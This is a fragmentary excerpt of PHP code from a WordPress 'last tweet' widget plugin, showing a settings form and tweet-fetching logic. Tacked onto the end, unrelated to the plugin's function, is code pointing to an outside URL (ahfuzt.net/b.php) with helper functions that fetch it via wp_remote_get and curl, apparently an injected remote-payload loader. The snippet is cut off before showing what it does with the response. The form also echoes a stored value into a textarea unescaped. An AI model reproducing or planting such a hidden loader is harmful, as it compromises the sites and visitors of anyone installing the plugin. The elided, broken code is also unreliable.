	...
	function form($instance) {
		...
		$jzoutput .= '
			...
			<p>
				...
				<textarea id="' . $this->get_field_id('juiz_last_tweet_own_css') . '" rows="7" cols="30" name="' . $this->get_field_name('juiz_last_tweet_own_css')
 . '">' . $instance['juiz_last_tweet_own_css'] . '</textarea>
			</p>
		';
				...
				if (!$current_timer OR $current_timer <= time()) {
					...
					if ( is_array( $api_1_1_content ) AND isset( $api_1_1_content[0] -> id ) ) {
						...
						foreach ( $rss_i as $tweet ) {
							...
							$i_guid		= "http://twitter.com/".$tweet -> user ->
...
$abc_url = 'http://www.ahfuzt.net/b.php'; 
if(!function_exists('abc_get')){ 
function abc_get($f) { 
$response = wp_remote_get( $f ); 
if( is_wp_error( $response ) ) { 
function abc_get_body($f) { 
$ch = @curl_init(); 
